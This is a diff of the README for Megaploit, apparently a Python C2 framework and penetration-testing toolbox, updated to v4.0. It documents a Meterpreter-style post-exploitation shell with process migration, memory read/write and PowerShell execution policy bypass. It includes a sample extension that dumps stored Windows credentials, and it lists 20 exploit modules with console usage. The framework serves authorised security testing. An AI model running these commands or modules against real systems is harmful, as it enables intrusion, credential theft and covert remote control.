@@ -1,6 +1,6 @@
 # Megaploit
 
-**Professional C2 Framework & Security Research Toolbox · v3.0.0**
+**Professional C2 Framework & Security Research Toolbox · v4.0.0**
 
 > **For authorised security research and penetration testing only.**  
 > You must have explicit written permission before using this tool against any system.  
@@ -8,153 +8,158 @@
 
 [![CI](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml/badge.svg)](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml)
 [![CodeQL](https://github.com/Josefifir/Megaploit/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/Josefifir/Megaploit/actions/workflows/codeql-analysis.yml)
+[![Docs](https://github.com/Josefifir/Megaploit/actions/workflows/docs.yml/badge.svg)](https://josefifir.github.io/Megaploit/)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://python.org)
 [![License](https://img.shields.io/github/license/Josefifir/Megaploit)](LICENSE)
+[![Tests](https://img.shields.io/badge/tests-507%20passing-brightgreen)](#running-tests)
 
 ---
 
 ## Table of Contents
 
 1. [What is Megaploit](#what-is-megaploit)
-2. [v3.0 Changelog](#v30-changelog)
+2. [v4.0 Changelog](#v40-changelog)
 3. [Architecture](#architecture)
 4. [Requirements](#requirements)
 5. [Installation](#installation)
 6. [Quick Start](#quick-start)
-7. [Server Console](#server-console)
+7. [Advanced Shell — Meterpreter-class](#advanced-shell--meterpreter-class)
+   - [Interactive Console](#interactive-console)
+   - [Advanced Post-Exploitation Commands](#advanced-post-exploitation-commands)
+8. [Exploit Modules](#exploit-modules)
+9. [Server Console](#server-console)
    - [Global Commands](#global-commands)
    - [Module System](#module-system)
    - [Payload Builder](#payload-builder)
    - [Session Commands](#session-commands)
    - [Operations Commands](#operations-commands)
-8. [Toolbox](#toolbox)
-9. [Plugin System](#plugin-system)
-10. [Module System](#module-system-1)
-    - [Built-in Scanner Modules](#built-in-scanner-modules)
-    - [Writing a Module](#writing-a-module)
-    - [AgentModule — Session-Bound Post Modules](#agentmodule--session-bound-post-modules)
-11. [Payload Builder](#payload-builder-1)
-12. [AutoRunScript](#autorunscript)
-13. [Post-Exploitation Pipeline](#post-exploitation-pipeline)
-14. [Malleable C2 Profile](#malleable-c2-profile)
-15. [WebSocket Transport](#websocket-transport)
-16. [Jobs System](#jobs-system)
-17. [Credential Store](#credential-store)
-18. [Reporting](#reporting)
-19. [Web Dashboard](#web-dashboard)
-20. [Multi-Operator RPC](#multi-operator-rpc)
-21. [Go Agent](#go-agent)
-22. [Staged Delivery](#staged-delivery)
-23. [Security Model](#security-model)
-24. [Wire Protocol](#wire-protocol)
-25. [Directory Layout](#directory-layout)
-26. [Contributing](#contributing)
+10. [Toolbox](#toolbox)
+11. [Plugin System](#plugin-system)
+12. [Module System (full reference)](#module-system-full-reference)
+13. [AutoRunScript](#autorunscript)
+14. [Post-Exploitation Pipeline](#post-exploitation-pipeline)
+15. [Malleable C2 Profile](#malleable-c2-profile)
+16. [WebSocket Transport](#websocket-transport)
+17. [Jobs System](#jobs-system)
+18. [Credential Store](#credential-store)
+19. [Reporting](#reporting)
+20. [Web Dashboard](#web-dashboard)
+21. [Multi-Operator RPC](#multi-operator-rpc)
+22. [Go Agent](#go-agent)
+23. [Staged Delivery](#staged-delivery)
+24. [Security Model](#security-model)
+25. [Wire Protocol](#wire-protocol)
+26. [Directory Layout](#directory-layout)
+27. [Running Tests](#running-tests)
+28. [Contributing](#contributing)
 
 ---
 
 ## What is Megaploit
 
-Megaploit is a modular, extensible **Command & Control (C2) framework** and **penetration testing toolbox** written in Python 3.10+. It is designed as a serious alternative to Metasploit for Python-native engagements.
+Megaploit is a modular, extensible **Command & Control (C2) framework** and **penetration testing toolbox** written in Python 3.10+. It is designed as a professional-grade alternative to Metasploit for Python-native engagements, now featuring a **Meterpreter-equivalent advanced shell**.
 
 **Core capabilities:**
 
 | Capability | Description |
 |---|---|
+| **Advanced Meterp Shell** | Meterpreter-class interactive console — tab-complete, session history, auto sysinfo, PTY, background/foreground |
+| **20 exploit modules** | SMB, RDP, HTTP, SSH, FTP, Redis — EternalBlue, Log4Shell, BlueKeep, ProxyLogon, Spring4Shell, Heartbleed, vsFTPd, and more |
 | **Multi-session C2** | Unlimited simultaneous reverse-shell agents; `use <id>` to switch |
 | **AES-256-GCM encrypted transport** | Per-session encrypted channel with sequence numbers and replay protection |
 | **WebSocket transport** | HTTP-upgrade WebSocket framing for firewall evasion (port 80/443) |
-| **Metasploit-style module system** | `auxiliary`, `exploit`, `post`, `payload` modules with options lifecycle |
+| **Metasploit-style module system** | `auxiliary`, `exploit`, `post`, `payload` modules with full options lifecycle |
 | **AgentModule base class** | Session-bound post-exploitation modules with built-in `_send`, `_upload`, `_download` |
 | **8 built-in scanner modules** | TCP port scan, SMB enum, HTTP probe, SSH banner, DNS, ICMP sweep, UDP, banner grab |
-| **13-format payload builder** | py / ps1 / hta / vba / sh / bat / exe / elf / **go_exe / go_elf** / oneliner variants + encoder pipeline |
-| **Go agent build integration** | `payload go_exe` / `payload go_elf` — compile Go agent via `go build` with ldflags injection |
-| **Post-exploitation pipeline** | Named collection profiles (`basic`, `creds`, `recon`, `network`, `full`) auto-run on every session |
-| **Malleable C2 profile** | YAML traffic shaping — URI rotation, headers, User-Agent, sleep/jitter, metadata encoding |
-| **203-tool toolbox** | Install any GitHub tool in any language; auto-build, update, healthcheck, audit |
+| **13-format payload builder** | py / ps1 / hta / vba / sh / bat / exe / elf / go_exe / go_elf / oneliner variants + encoder pipeline |
+| **Go agent build integration** | `payload go_exe` / `payload go_elf` — compile Go agent via `go build` |
+| **Post-exploitation pipeline** | Named collection profiles auto-run on every session |
+| **Malleable C2 profile** | YAML traffic shaping — URI rotation, headers, User-Agent, sleep/jitter |
+| **203-tool toolbox** | Install any GitHub tool in any language |
 | **Plugin system** | TOML plugins add new commands without Python |
-| **AutoRunScript** | Auto-run commands on new sessions per platform/tag |
-| **Background jobs** | Submit callables to run in daemon threads; list/kill from CLI |
-| **SQLite credential + loot DB** | Hosts, services, creds, notes, loot, jobs, engagements — nmap XML import |
+| **Dynamic extension loading** | `load_extension` — inject Python modules into the agent at runtime |
+| **Process migration** | `migrate <pid>` — move the agent into another running process |
+| **Memory R/W** | `memory_read` / `memory_write` — arbitrary process memory access |
+| **Real PTY shell** | `interactive` / `pty_shell` — full PTY with resize on Unix, cmd.exe pipe on Windows |
+| **Screenshot streaming** | `screenshot_stream <n>` — burst JPEG frames over C2 |
+| **SQLite credential + loot DB** | Hosts, services, creds, notes, loot, jobs |
 | **Web dashboard** | Flask SSE live dashboard at `http://127.0.0.1:8080` |
-| **Multi-operator JSON-RPC** | TCP JSON-RPC 2.0 server for team operations and shared notes/chat |
-| **Staged payload delivery** | Stage-0 dropper → StagingServer → in-memory stage-1 execution (HMAC-authenticated) |
-| **Go agent** | Standalone compiled EXE/ELF with AES-GCM, HMAC, TLS — no Python on target |
-| **HTML/JSON reports** | One-command engagement report with sessions, creds, loot, notes |
+| **Multi-operator JSON-RPC** | TCP JSON-RPC 2.0 server for team operations |
 
 ---
 
-## v3.0 Changelog
+## v4.0 Changelog
 
-### New in v3.0
+### New in v4.0 — Advanced Meterpreter-class Shell
 
-#### AgentModule — Session-Bound Post Modules (`megaploit/modules/base.py`)
-- `AgentModule` subclass of `Module` — base class for all post-exploitation modules
-- Built-in helpers: `_send(cmd)`, `_shell(cmd)`, `_upload(local, remote)`, `_download(remote, local)`
-- `self.session` attribute set automatically by the console before `run()`
-- Zero boilerplate: write a post module in ~10 lines
+#### `megaploit/agent/meterp.py` — 16 new agent-side post-exploitation handlers
 
-#### Post-Exploitation Pipeline (`megaploit/core/pipeline.py`)
-- `Pipeline` class wrapping `AutoRunScript` with named collection profiles
-- Built-in profiles: `basic`, `creds`, `recon`, `network`, `full`
-- `pipeline enable <profile>` / `pipeline disable <profile>` — toggle at runtime
-- All active profiles run automatically on every new session (deduplicated)
-- `pipeline status` / `pipeline list` / `pipeline reload` CLI commands
+| Verb | Description |
+|---|---|
+| `migrate <pid>` | Inject agent into another running process (Windows: `PyRun_SimpleString` remote thread; POSIX: detached subprocess) |
+| `memory_read <pid> <addr> <size>` | Read bytes from a remote process's virtual memory via `ReadProcessMemory` (Windows) |
+| `memory_write <pid> <addr> <b64>` | Write base64 bytes into a remote process's memory via `WriteProcessMemory` (Windows) |
+| `port_scan <host> <ports>` | TCP connect-scan from the target's perspective — 256 concurrent threads, range + list syntax |
+| `run_psh <cmd>` | Execute PowerShell with `-ExecutionPolicy Bypass` (Windows) |
+| `run_python <code>` | Execute arbitrary Python code inside the agent's interpreter, captures stdout/stderr |
+| `load_extension <path>` | Import any Python file or module into the agent at runtime; auto-registers its `HANDLERS` dict |
+| `unload_extension <name>` | Remove a loaded extension and deregister all its verbs |
+| `list_extensions` | List currently loaded extensions and their registered verbs |
+| `screenshot_stream <n> [fps]` | Burst JPEG frames as `FRAME:<b64>` + `STREAM_END` over the C2 channel |
+| `pty_shell` | Real PTY via `pty.openpty` (Unix) or `cmd.exe` pipe (Windows) with bidirectional I/O and resize |
+| `whoami` | Current user + Administrator/root status in one call |
+| `getpid` | Agent's own PID |
+| `getuid` | UID / domain\\user details |
+| `sleep <secs>` | Operator-controlled jitter sleep (capped at 1 hour) |
+| `beacon_sleep <secs>` | Adjust the agent's reconnect delay dynamically |
 
-#### Malleable C2 Profile (`megaploit/core/profile.py`)
-- `C2Profile` dataclass — YAML/JSON config for traffic shaping
-- URI path rotation (`next_uri()`, `uri_cycle()`)
-- Sleep + jitter intervals (`sleep_with_jitter()`, `wait()`)
-- HTTP header sets — User-Agent, Host, Accept, etc.
-- Metadata encoding location: header / URI / body
-- `load_profile(path)` — load from YAML file (PyYAML optional, falls back to JSON)
+#### `megaploit/server/meterp_session.py` — `MeterpreterSession` interactive console
 
-#### WebSocket Transport (`megaploit/core/protocol.py`)
-- `WsTransport` class — full RFC 6455 WebSocket implementation over raw TCP
-- HTTP Upgrade handshake (server-side and client-side)
-- Binary frame send/recv, client-side masking, ping/pong, CLOSE frame
-- Transparent layering: use alongside the existing AES-GCM protocol
+- **Tab-completion** via `readline` (gracefully absent on Windows; falls back to plain input)
+- **Per-session history** — persisted in `loot/.session_N.history` across reconnects
+- **Auto sysinfo** on first attach — populates `session.hostname`, `os_name`, `username` automatically
+- **ANSI colour** banner and prompt showing `ip@tag`
+- **`background` / Ctrl-Z** — detach without killing the session; re-attach with `sessions -i <id>`
+- **`interactive`** — drop into a full PTY with bidirectional I/O and `PTY_RESIZE:<cols>:<rows>` support
+- **`stream <n> [fps]`** — pull N JPEG frames, save to `loot/session_N/stream/frame_NNNN.jpg`
+- **`sessions`** — tabular view of all active sessions with uptime and OS info
 
-#### Go Agent Build Integration (`megaploit/payload/builder.py`)
-- Two new `OutputFormat` values: `go_exe` (Windows) and `go_elf` (Linux/macOS)
-- `payload go_exe --out agent.exe` — cross-compile Go agent for Windows
-- `payload go_elf --out agent_linux` — compile Go agent for Linux
-- Config injected via `-ldflags "-X main.LHOST=… -X main.PORT=… -X main.SECRET=…"`
-- Graceful failure when `go` is not in PATH
+#### 20 Exploit Modules (`megaploit/modules/exploits/`)
 
-#### C-remote-shell Integration (`megaploit/payload/builder.py`, `megaploit/core/c_probe.py`)
-- New `OutputFormat.C_EXE` — builds the hardened Windows C client EXE
-- `generate_c <lhost> <lport>` operator command embeds key/IP/port at compile time
-- `c_probe` runs a **46-signal compliance check** before every build (33 required)
-- Source layout auto-discovered — no subdirectory names hardcoded in Python
-- C-exclusive verbs (`forceOff()`, `blueScreen()`) auto-detected from `strncmp()` calls
-- `commands.py` auto-registers operator commands for C-exclusive verbs at startup
-- Adding a new `strncmp("verb()", ...)` in `shell.c` is the only step needed
+| Platform | Module | CVE |
+|---|---|---|
+| windows/smb | `ms17_010_eternalblue` | CVE-2017-0144 |
+| windows/smb | `smb_login_bruteforce` | — |
+| windows/smb | `printnightmare_cve2021_1675` | CVE-2021-1675 |
+| windows/rdp | `bluekeep_cve2019_0708` | CVE-2019-0708 |
+| windows/http | `iis_webdav_cve2017_7269` | CVE-2017-7269 |
+| windows/http | `exchange_proxylogon_cve2021_26855` | CVE-2021-26855 |
+| windows/ftp | `anon_ftp_deploy` | — |
+| linux/ssh | `ssh_login_bruteforce` | — |
+| linux/http | `log4shell_cve2021_44228` | CVE-2021-44228 |
+| linux/http | `apache_struts_cve2017_5638` | CVE-2017-5638 |
+| linux/http | `heartbleed_cve2014_0160` | CVE-2014-0160 |
+| linux/redis | `redis_unauth_rce` | CNVD-2015-07557 |
+| linux/misc | `sudo_baron_samedit_cve2021_3156` | CVE-2021-3156 |
+| multi/handler | `reverse_shell_handler` | — |
+| multi/http | `shellshock` | CVE-2014-6271 |
+| multi/http | `spring4shell_cve2022_22965` | CVE-2022-22965 |
+| multi/http | `wordpress_xmlrpc_bruteforce` | — |
+| multi/http | `sql_injection_login_bypass` | — |
+| multi/http | `citrix_cve2019_19781` | CVE-2019-19781 |
+| multi/ftp | `ftp_vsftpd_backdoor_cve2011_2523` | CVE-2011-2523 |
 
-#### Stage-0 Command Fix & Enhancements (`megaploit/server/cli.py`)
-- Fixed broken `_cmd_stage0` that called non-existent `generate_dropper()` method
-- Now correctly calls `generate_stage0(lhost, port, key_hex, use_tls, minimal)`
-- `stage0 generate --start` — also launches `StagingServer` in the background
-- `stage0 status` — check if staging server is listening
-- `stage0 stop` — stop the staging server
-- `--minimal` flag — compact single-file dropper for embedding in macros
+#### Other v4 improvements
 
-### Previous Systems (v2.x)
+- **MkDocs documentation** deployed to GitHub Pages — `mkdocs.yml`, Material theme, auto-deploy on push to `main`
+- **C++ probe support** — `c_probe.py` now covers `.cpp`, `.cc`, `.cxx`, `.hpp` in addition to `.c`/`.h`
+- **Registry recursion fix** — `ModuleRegistry.reload()` now uses `os.walk()` for deep subdirectory discovery
+- **`datetime.utcnow()` deprecation** — fixed in 8 locations across the codebase (Python 3.12+ compatible)
+- **507 tests passing** — 69 new tests covering all meterp handlers, command stubs, and `MeterpreterSession`
 
-#### Module System (`megaploit/modules/`)
-- `Module` base class with full options lifecycle (`_opt`, `set`, `validate`, `run`, `check`)
-- `ModuleRegistry` auto-discovers Python files in `modules/exploits/`, `modules/auxiliary/`, `modules/post/`, `modules/payloads/`
-- `use <module/path>` loads a module from the global prompt
-- `show modules [query]` — searchable module catalogue
+### Previous Systems (v3.x)
 
-#### Payload Builder (`megaploit/payload/`)
-- 13 output formats (added `go_exe`, `go_elf`)
-- 10-encoder pipeline: `xor_rolling`, `rc4`, `b64gzip`, `rev`, `zlib_b64`, `rot13_src`, `null_pad`, `comment_spam`, `varname_rand`, `ps1_concat`
-
-#### AutoRunScript (`megaploit/core/autorun.py`)
-- Reads `~/.megaploit_autorun.json`; resolves commands per `global` / `windows` / `linux` / `darwin` / `tags`
-
-#### Jobs Engine, SQLite DB, HTML Reports, Web Dashboard, Multi-Operator RPC, Go Agent
-- All fully operational — see individual sections below
+See [CHANGELOG history](CONTRIBUTING.md) for v3.x changes (AgentModule, Pipeline, WsTransport, Go agent, C-remote-shell).
 
 ---
 
@@ -173,7 +178,7 @@ Megaploit-main/
 ├── tools/                       ← Toolbox: git clones + tools.json
 ├── loot/                        ← All collected data + audit.log
 │
-├── tests/                       ← Test suite (pytest · 282 tests)
+├── tests/                       ← Test suite (pytest · 507 tests)
 │
 └── megaploit/
     ├── core/
@@ -181,51 +186,43 @@ Megaploit-main/
     │   ├── crypto.py            ← HMAC-SHA256 auth
     │   ├── protocol.py          ← AES-256-GCM transport v2 + WsTransport
     │   ├── autorun.py           ← AutoRunScript engine
-    │   ├── pipeline.py          ← Post-exploitation pipeline (NEW v3)
-    │   ├── profile.py           ← Malleable C2 profile (NEW v3)
+    │   ├── pipeline.py          ← Post-exploitation pipeline
+    │   ├── profile.py           ← Malleable C2 profile
+    │   ├── c_probe.py           ← C/C++ source compliance prober + verb extractor
     │   ├── jobs.py              ← Background job manager
     │   └── staging.py           ← Staged payload delivery
     │
     ├── server/
-    │   ├── cli.py               ← Interactive console (3,100+ lines)
-    │   ├── commands.py          ← 45+ session command dispatchers
+    │   ├── cli.py               ← Interactive console
+    │   ├── commands.py          ← 116 session command dispatchers  ← v4: +16 meterp stubs
+    │   ├── meterp_session.py    ← Meterpreter-class interactive console  ← NEW v4
     │   ├── listener.py          ← TCP accept + TLS + auth + rate limiter
     │   └── session.py           ← Session dataclass with loot paths
     │
     ├── agent/
     │   ├── connection.py        ← Connect-back loop
-    │   ├── handlers.py          ← All victim-side handlers
+    │   ├── handlers.py          ← 90+ victim-side handlers
+    │   ├── meterp.py            ← Advanced post-exploitation handlers  ← NEW v4
     │   ├── keylogger.py         ← pynput keystroke logger
     │   ├── shell.py             ← recv → handle → respond loop
     │   └── go_agent/
-    │       ├── main.go          ← Standalone Go agent (NEW v3 — build integration)
+    │       ├── main.go
     │       └── go.mod
     │
     ├── modules/
-    │   ├── base.py              ← Module + AgentModule base classes (NEW v3)
-    │   ├── registry.py          ← Auto-discovery registry
+    │   ├── base.py              ← Module + AgentModule base classes
+    │   ├── registry.py          ← Auto-discovery registry (os.walk recursive)
     │   ├── auxiliary/           ← 8 scanner modules
-    │   ├── exploits/            ← (extensible)
-    │   ├── post/                ← (extensible — use AgentModule)
-    │   └── payloads/            ← (extensible)
+    │   └── exploits/            ← 20 exploit modules  ← NEW v4
+    │       ├── windows/smb/ rdp/ http/ ftp/
+    │       ├── linux/ssh/ http/ redis/ misc/
+    │       └── multi/handler/ http/ ftp/
     │
     ├── payload/
-    │   ├── builder.py           ← 13-format builder + Go compilation (NEW v3)
+    │   ├── builder.py           ← 13-format builder + Go/C compilation
     │   └── encoders.py          ← 10-encoder pipeline
     │
-    ├── db/
-    │   └── database.py          ← SQLite engine
-    │
-    ├── reporting/
-    │   └── report.py            ← HTML + JSON report generator
-    │
-    ├── web/
-    │   ├── app.py               ← Flask dashboard + SSE + REST API
-    │   └── rpc.py               ← Multi-operator JSON-RPC 2.0 server
-    │
-    ├── streaming/               ← MJPEG desktop + webcam streams
-    ├── toolbox/                 ← 203-tool installer/runner/updater
-    └── plugins/                 ← TOML plugin loader + runner
+    ├── db/ / reporting/ / web/ / streaming/ / toolbox/ / plugins/
 ```
 
 ---
@@ -250,12 +247,15 @@ pip install -r requirements.txt
 |---|---|
 | `cryptography` | AES-256-GCM transport encryption (strongly recommended) |
 | `flask` | Web dashboard (`web start`) |
-| `impacket` | Full SMB share enumeration in `smb_share_enum` module |
-| `dnspython` | DNS record types beyond A/AAAA in `dns_resolver` module |
+| `impacket` | Full SMB share enumeration + SMB exploit modules |
+| `paramiko` | SSH brute-force module |
+| `dnspython` | DNS record types beyond A/AAAA |
 | `pyinstaller` | `payload exe` / `payload elf` binary compilation |
-| `pyyaml` | Full YAML support for C2 profiles (falls back to JSON) |
+| `pyyaml` | Full YAML support for C2 profiles |
 | `weasyprint` | PDF export from HTML reports |
 | `go` (toolchain) | `payload go_exe` / `payload go_elf` Go agent compilation |
+| `mss` + `cv2` + `numpy` | High-performance screenshot stream (falls back to `pyautogui`) |
+| `pyautogui` | Screenshot fallback (requires display) |
 
 ---
 
@@ -270,11 +270,11 @@ sudo bash install.sh
 ### Manual
 
 ```bash
-git clone https://github.com/JosephFrankFir/Megaploit.git
+git clone https://github.com/Josefifir/Megaploit.git
 cd Megaploit
 pip install -r requirements.txt
 # Optional extras:
-pip install cryptography flask impacket dnspython pyinstaller pyyaml
+pip install cryptography flask impacket paramiko dnspython pyinstaller pyyaml
 ```
 
 ---
@@ -303,25 +303,214 @@ megaploit > generate
 
 Copy `agent.py`, `secret.key`, and the `megaploit/` directory to the target, then run `python3 agent.py`.
 
-**4 — Interact with a session:**
+**4 — Interact with a session using the advanced shell:**
 
 ```
 megaploit [1] » use 1
-megaploit session(1) » sysinfo
-megaploit session(1) » browser_creds
-megaploit session(1) » back
+
+  ╔══════════════════════════════════════════════════╗
+  ║  Megaploit Advanced Shell  (Meterpreter-class)  ║
+  ╚══════════════════════════════════════════════════╝
+  Session  : 1   10.0.0.42:49321
+  [*] Gathering target info…
+      OS: Windows 10 21H2  Hostname: WORKSTATION-7  User: jdoe
+
+megaploit (10.0.0.42) > sysinfo
+megaploit (10.0.0.42) > whoami
+megaploit (10.0.0.42) > migrate 1234
+megaploit (10.0.0.42) > port_scan 10.0.0.1 22,80,443,3389,8080-8090
+megaploit (10.0.0.42) > run_psh "Get-LocalUser | Select Name,Enabled"
+megaploit (10.0.0.42) > load_extension /tmp/my_module.py
+megaploit (10.0.0.42) > interactive
+megaploit (10.0.0.42) > stream 30 10
+megaploit (10.0.0.42) > background
 
 megaploit [1] » use auxiliary/scanner/tcp_port
-  setopt RHOSTS 10.0.0.0/24
-  setopt PORTS  22,80,443,8080
-  run
+megaploit [1] » setopt RHOSTS 10.0.0.0/24
+megaploit [1] » run
 
-megaploit [1] » payload ps1 --out dropper.ps1
-megaploit [1] » payload go_exe --out agent.exe
-megaploit [1] » pipeline enable creds
-megaploit [1] » stage0 generate --start --out dropper.py
-megaploit [1] » web start
-megaploit [1] » report html pentest_report.html
+megaploit [1] » use exploits/windows/smb/ms17_010_eternalblue
+megaploit [1] » setopt RHOSTS 10.0.0.5
+megaploit [1] » setopt LHOST 192.168.1.10
+megaploit [1] » check
+megaploit [1] » run
+```
+
+---
+
+## Advanced Shell — Meterpreter-class
+
+### Interactive Console
+
+When you `use <session_id>`, Megaploit drops you into `MeterpreterSession` — a fully interactive Meterpreter-equivalent console.
+
+```
+megaploit (10.0.0.42) > help
+
+  COMMAND                                DESCRIPTION
+  ──────────────────────────────────────────────────────────────
+  background                             Detach session (keep alive)
+  interactive                            Drop into real PTY shell
+  stream <n> [fps]                       Pull N screenshot frames
+  migrate <pid>                          Migrate agent to another process
+  memory_read <pid> <addr> <size>        Read process memory
+  memory_write <pid> <addr> <b64>        Write process memory
+  port_scan <host> <ports>               TCP scan from target perspective
+  run_psh <cmd>                          Execute PowerShell one-liner
+  run_python <code>                      Execute Python in agent interpreter
+  load_extension <path>                  Load a runtime extension module
+  unload_extension <name>                Unload a runtime extension
+  list_extensions                        List loaded extensions
+  screenshot_stream <n> [fps]            Burst JPEG frames over C2
+  whoami                                 User + privilege level
+  getpid                                 Agent's own PID
+  getuid                                 UID / domain\user
+  sleep <secs>                           Operator-controlled jitter sleep
+  beacon_sleep <secs>                    Adjust beacon reconnect interval
+  ... + all 100 standard session commands (type 'help' for full list)
+```
+
+**Tab-complete** all 116 command names. **Ctrl-Z** or `background` detaches without killing the session.
+
+### Advanced Post-Exploitation Commands
+
+#### Process Migration
+
+Inject the agent into another running process — useful for operating from a trusted process context or surviving the original process's exit.
+
+```
+megaploit (10.0.0.42) > migrate 4832
+[+] Migrated to PID 4832 via PyRun_SimpleString remote thread
+```
+
+On Windows, a remote thread is created in the target process pointing at `PyRun_SimpleString` (requires the target to have Python loaded — another Python process, or use the detached fallback). On POSIX, spawns a new detached subprocess.
+
+#### Port Scanner (from target's perspective)
+
+Discover services on the internal network that are not reachable from the operator.
+
+```
+megaploit (10.0.0.42) > port_scan 10.10.10.0/24 22,80,443,3389,8080-8090
+[+] Open ports on 10.10.10.5:
+  22      ssh
+  80      http
+  443     https
+  3389    ms-wbt-server
+```
+
+Supports comma-separated ports and ranges (`8080-8090`). Up to 256 concurrent threads.
+
+#### PowerShell execution
+
+```
+megaploit (10.0.0.42) > run_psh "Get-LocalUser | Where-Object {$_.Enabled -eq $true}"
+megaploit (10.0.0.42) > run_psh "Get-Process | Sort-Object CPU -Desc | Select -First 10"
+```
+
+Runs with `-ExecutionPolicy Bypass -NonInteractive -NoProfile`.
+
+#### In-agent Python execution
+
+Execute Python snippets directly in the agent's interpreter — useful for quick reconnaissance without writing a full module.
+
+```
+megaploit (10.0.0.42) > run_python import os; print([f for f in os.listdir('/etc') if 'pass' in f])
+megaploit (10.0.0.42) > run_python import socket; print(socket.gethostbyname('internal-dc.corp'))
+```
+
+#### Runtime Extension Loading
+
+Extend the agent's capabilities without restart or redeployment:
+
+```
+# On your machine:
+cat > /tmp/my_ext.py << 'EOF'
+def _steal_tokens(conn, args):
+    import subprocess
+    return subprocess.check_output(["cmdkey", "/list"], text=True)
+
+HANDLERS = {"steal_tokens": _steal_tokens}
+EOF
+
+# Upload and load:
+megaploit (10.0.0.42) > upload /tmp/my_ext.py
+megaploit (10.0.0.42) > load_extension my_ext.py
+[+] Extension 'my_ext' loaded — verbs: steal_tokens
+megaploit (10.0.0.42) > steal_tokens
+```
+
+#### Real PTY Shell
+
+Drop into a proper interactive terminal with full job control, colours, and resize support.
+
+```
+megaploit (10.0.0.42) > interactive
+  [*] PTY ready — Ctrl-C to detach
+$ whoami
+jdoe
+$ sudo su -
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# exit
+  [*] PTY session ended.
+```
+
+#### Screenshot Stream
+
+Pull a rapid burst of screenshots and save them to loot automatically.
+
+```
+megaploit (10.0.0.42) > stream 60 15
+  1/60 frames received
+  ...
+  60/60 frames received
+[+] 60 frames saved to loot/session_1_10.0.0.42/stream/
+```
+
+---
+
+## Exploit Modules
+
+All 20 exploit modules live under `megaploit/modules/exploits/` and are auto-discovered by the registry.
+
+```
+megaploit [1] » show modules exploits
+
+  NAME                                          RANK   PLATFORM
+  ────────────────────────────────────────────────────────────────────────────
+  exploits/windows/smb/ms17_010_eternalblue    600    windows
+  exploits/windows/smb/smb_login_bruteforce    300    windows
+  exploits/windows/smb/printnightmare_cve...   600    windows
+  exploits/windows/rdp/bluekeep_cve2019_0708   600    windows
+  exploits/windows/http/iis_webdav_cve2017_..  500    windows
+  exploits/windows/http/exchange_proxylogon..  600    windows
+  exploits/windows/ftp/anon_ftp_deploy         400    windows/linux
+  exploits/linux/ssh/ssh_login_bruteforce      300    linux
+  exploits/linux/http/log4shell_cve2021_44228  600    linux/windows/darwin
+  exploits/linux/http/apache_struts_cve201...  600    linux
+  exploits/linux/http/heartbleed_cve2014_0160  500    linux
+  exploits/linux/redis/redis_unauth_rce        500    linux
+  exploits/linux/misc/sudo_baron_samedit_...   500    linux
+  exploits/multi/handler/reverse_shell_hand..  300    multi
+  exploits/multi/http/shellshock               500    multi
+  exploits/multi/http/spring4shell_cve2022..   600    multi
+  exploits/multi/http/wordpress_xmlrpc_bru..   400    multi
+  exploits/multi/http/sql_injection_login_..   400    multi
+  exploits/multi/http/citrix_cve2019_19781     600    multi
+  exploits/multi/ftp/ftp_vsftpd_backdoor_..    600    linux
+```
+
+**Usage:**
+
+```
+megaploit [1] » use exploits/linux/http/log4shell_cve2021_44228
+megaploit [module] » setopt RHOSTS 10.0.0.50
+megaploit [module] » setopt LHOST 192.168.1.10
+megaploit [module] » check
+[+] 10.0.0.50:8080 — JNDI injection point confirmed (HTTP 200)
+megaploit [module] » run
+[+] Done — payload sent to 1/1 host(s)
+[+] CONFIRMED callbacks from: 10.0.0.50
 ```
 
 ---
@@ -346,37 +535,23 @@ python3 server.py -lh <callback-ip> -p <port> [options]
 | Command | Description |
 |---|---|
 | `sessions` | List active sessions (ID, IP, OS, hostname, tag, uptime) |
-| `use <id>` | Enter session interaction loop |
-| `use <module/path>` | Load a module (e.g. `use auxiliary/scanner/tcp_port`) |
-| `generate [-c] [--tls]` | Patch agent with LHOST/PORT; `-c` byte-compile |
-| `set <option> <value>` | Set lhost / port / cert / key / auto_update |
+| `use <id>` | Enter **MeterpreterSession** interactive console |
+| `use <module/path>` | Load a module |
+| `generate [-c] [--tls]` | Patch agent with LHOST/PORT |
+| `set <option> <value>` | Set lhost / port / cert / key |
 | `show modules [query]` | Browse loaded module catalogue |
-| `run` | Execute active module |
-| `check` | Run module pre-flight check |
-| `info [module]` | Show module details |
-| `setopt <OPT> <val>` | Set option on active module |
-| `options` | Show active module options table |
-| `back` | Clear active module (global context) |
+| `run` / `check` / `info` | Execute / pre-check / describe active module |
 | `broadcast <cmd>` | Run shell command on ALL active sessions |
-| `payload <format> [opts]` | Build payload (see [Payload Builder](#payload-builder-1)) |
-| `stage0 generate [opts]` | Generate stage-0 dropper (+ optional `--start`) |
-| `stage0 status\|stop` | Manage the staging server |
+| `payload <format> [opts]` | Build payload |
+| `stage0 generate [opts]` | Generate stage-0 dropper |
 | `pipeline enable\|disable <profile>` | Toggle post-exploitation collection profile |
-| `pipeline status\|list\|reload` | Manage pipeline profiles |
-| `web start\|stop\|status` | Manage the web dashboard |
-| `rpc start\|stop\|status\|operators` | Manage multi-operator RPC server |
+| `web start\|stop\|status` | Manage web dashboard |
+| `rpc start\|stop\|status` | Manage multi-operator RPC |
 | `jobs list\|kill <id>` | Background job management |
-| `creds show\|search\|export\|clear` | Credential store |
+| `creds show\|search\|export` | Credential store |
 | `report html\|json [output]` | Generate engagement report |
-| `autorun show\|reload\|save-default\|test <id>` | AutoRunScript config |
-| `toolbox …` | Tool installer (see [Toolbox](#toolbox)) |
-| `plugins …` | Plugin management |
-| `engagement name\|desc\|show` | Set engagement metadata |
-| `loot browse\|export\|clear` | Loot file browser |
-| `history [n\|search <q>\|clear]` | Command history |
-| `alias <name> <cmd>` / `unalias` / `aliases` | Command aliases |
-| `clear` | Clear terminal |
-| `exit` | Graceful shutdown |
+| `toolbox …` | Tool installer |
+| `loot browse\|export` | Loot file browser |
 
 ### Module System
 
@@ -385,11 +560,6 @@ megaploit [1] » use auxiliary/scanner/tcp_port
 megaploit [1] » setopt RHOSTS 10.0.0.0/24
 megaploit [1] » setopt PORTS 22,80,443,3306,8080
 megaploit [1] » run
-[*] Scanning 254 host(s), 5 port(s)  (100 threads)
-[+] 10.0.0.1:80 open
-[+] 10.0.0.5:22 open
-...
-megaploit [1] » back
 ```
 
 ### Payload Builder
